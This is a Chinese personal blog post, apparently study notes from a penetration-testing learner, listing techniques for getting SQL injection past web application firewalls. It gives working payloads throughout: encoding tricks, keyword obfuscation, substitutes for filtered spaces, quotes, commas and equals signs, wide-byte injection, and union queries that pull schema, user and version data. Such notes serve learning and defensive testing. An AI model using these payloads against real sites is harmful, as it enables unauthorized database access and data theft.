@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="学习一下sql绕waf的常用手法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql绕waf姿势">
+<meta property="og:url" content="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="知鱼的Blog">
+<meta property="og:description" content="学习一下sql绕waf的常用手法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/1.png">
+<meta property="article:published_time" content="2025-06-24T14:51:16.000Z">
+<meta property="article:modified_time" content="2025-06-26T15:27:04.335Z">
+<meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/1.png">
+
+<link rel="canonical" href="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql绕waf姿势 | 知鱼的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">知鱼的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zh1yu2.jpg">
+      <meta itemprop="name" content="zh1yu">
+      <meta itemprop="description" content="花有重开日,人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="知鱼的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql绕waf姿势
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-24 22:51:16" itemprop="dateCreated datePublished" datetime="2025-06-24T22:51:16+08:00">2025-06-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 23:27:04" itemprop="dateModified" datetime="2025-06-26T23:27:04+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 学习一下sql绕waf的常用手法</p>
+<span id="more"></span>
+<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p><strong>1.—空格</strong>：我们常用<code>--+</code>进行注释，因为+号通常被url解析为空格</p>
+<p><strong>2.#：</strong>#也可以注释后面的内容，也可以用<strong>%23</strong>替换</p>
+<p><strong>3./<em>注释内容</em>/：</strong>内联注释通常注释中间的部分，一前一后进行闭合，这种不太常用，但可以<strong>用于禁用空格的bypass</strong></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>当waf对大小写不敏感的时候可以使用，eg：<code>uniOn selEct 1,2</code></p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>把一些特有的仅在MYSQL上的语句放在 /<em>!语句</em>/ 中，这样的语句只会在mysql中有效，能够执行</p>
+<p><code>union /*!select*/ 1,2,3</code></p>
+<h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>有些waf将关键字select等使用replace()函数置换为空，这种可以使用双写关键字绕过：</p>
+<p><code>union seselectlect 1,2</code></p>
+<h3 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h3><p><strong>1.十六进制绕过：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt="图片"></p>
+<p><strong>2.ascii编码绕过：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">117</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">114</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)或者<span class="type">CHAR</span>(<span class="number">117</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>3.Unicode编码绕过</strong></p>
+<p>常用的几个符号的一些Unicode编码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号: <span class="operator">%</span>u0027、<span class="operator">%</span>u02b9、<span class="operator">%</span>u02bc、<span class="operator">%</span>u02c8、<span class="operator">%</span>u2032、<span class="operator">%</span>uff07、<span class="operator">%</span>c0<span class="operator">%</span><span class="number">27</span>、<span class="operator">%</span>c0<span class="operator">%</span>a7、<span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a7</span><br><span class="line">空格：<span class="operator">%</span>u0020、<span class="operator">%</span>uff00、<span class="operator">%</span>c0<span class="operator">%</span><span class="number">20</span>、<span class="operator">%</span>c0<span class="operator">%</span>a0、<span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a0</span><br><span class="line">左括号：<span class="operator">%</span>u0028、<span class="operator">%</span>uff08、<span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span>、<span class="operator">%</span>c0<span class="operator">%</span>a8、<span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br><span class="line">右括号：<span class="operator">%</span>u0029、<span class="operator">%</span>uff09、<span class="operator">%</span>c0<span class="operator">%</span><span class="number">29</span>、<span class="operator">%</span>c0<span class="operator">%</span>a9、<span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a9</span><br></pre></td></tr></table></figure>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>使用<strong>+</strong>号替代空格：例如，union+select+1,2,3<br><strong>URL编码</strong>替代：%20（空格）、%09（水平制表符HT）、%0A（换行符LF）、%0C（换页符FF）、%0D（回车CR）、%0B（垂直制表符VT）、%A0（不间断空格NBS）<br>使用SQL注释符<strong>//</strong>替代空格，如：union//select<br>括号<strong>()</strong>替代空格：select(passwd)from(users) </p>
+<h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure>
+<h3 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）不加通配符的<span class="keyword">like</span>执行的效果和<span class="operator">=</span>一致，所以可以用来绕过。</span><br><span class="line">eg：<span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="keyword">like</span> &quot;users&quot;</span><br><span class="line"><span class="number">2</span>）rlike:模糊匹配，只要字段的值中存在要查找的部分就会被选择出来，用来取代<span class="operator">=</span>时，rlike的用法和上面的<span class="keyword">like</span>一样，没有通配符效果和<span class="operator">=</span>一样</span><br><span class="line">eg：<span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name rlike &quot;users&quot;</span><br><span class="line"><span class="number">3</span>）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</span><br><span class="line">eg：<span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name regexp &quot;users&quot;</span><br><span class="line"><span class="number">4</span>）使用大小于号来绕过</span><br><span class="line">eg：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">1</span> <span class="keyword">and</span> id <span class="operator">&lt;</span> <span class="number">3</span></span><br><span class="line"><span class="number">5</span>）<span class="operator">&lt;&gt;</span> 等价于 <span class="operator">!=</span>，所以在前面再加一个<span class="operator">!</span>结果就是等号了</span><br><span class="line">eg：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h3><p>1）使用<strong>十六进制</strong></p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
+<p>2）<strong>宽字节</strong>，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 ‘(单引号)，单引号会被转义成\’</p>
+<p>eg：%E6’ union select 1,2 #</p>
+<p>%df%27 union select  1,2,3  #</p>
+<h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>1.联合查询<strong>显注</strong>绕过逗号：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C）;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(<span class="keyword">user</span>(),<span class="string">&#x27; &#x27;</span>,database(),<span class="string">&#x27; &#x27;</span>,@<span class="variable">@datadir</span>))C);</span><br></pre></td></tr></table></figure>
+<p>2.<strong>盲注</strong>中逗号绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> user_id,<span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>() <span class="keyword">from</span> <span class="number">2</span>))<span class="operator">=</span><span class="number">114</span>) ;</span><br></pre></td></tr></table></figure>
+<h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><p>1）sleep() —&gt;benchmark()</p>
+<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
+<p>eg：select 1,2 and benchmark(1000000000,1)</p>
+<p>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</p>
+<p>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符 </p>
+<p>eg：mysql&gt; select concat_ws(“,”,”str1”,”str2”)</p>
+<p>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
+<p>5）user() —&gt; @@user、datadir–&gt;@@datadir</p>
+<p>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致</p>
+<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span></span><br></pre></td></tr></table></figure>
+<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zkaqlaoniao/article/details/120948100">SQL篇之SQL注入绕过姿势总结_sql注入如何绕过字符转义-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diecai2192/article/details/102118053">SQL注入—显注和盲注中过滤逗号绕过-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>zh1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zh1yu.xyz/2025/06/24/sql%E7%BB%95waf%E5%A7%BF%E5%8A%BF/" title="sql绕waf姿势">http://zh1yu.xyz/2025/06/24/sql绕waf姿势/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/20/sqli-labs%E9%9D%B6%E5%9C%BAless-1-10/" rel="prev" title="sqli-labs靶场less-1-10">
+      <i class="fa fa-chevron-left"></i> sqli-labs靶场less-1-10
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">注释符绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">内联注释绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">双写关键字绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">特殊编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">空格过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">过滤or and xor not 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">过滤等号&#x3D;绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">9.</span> <span class="nav-text">过滤引号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">10.</span> <span class="nav-text">过滤逗号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">11.</span> <span class="nav-text">过滤函数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">12.</span> <span class="nav-text">缓冲区溢出</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zh1yu"
+      src="/images/zh1yu2.jpg">
+  <p class="site-author-name" itemprop="name">zh1yu</p>
+  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh1yu</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="/js/snow.js"></script>
+
+</body>
+</html>
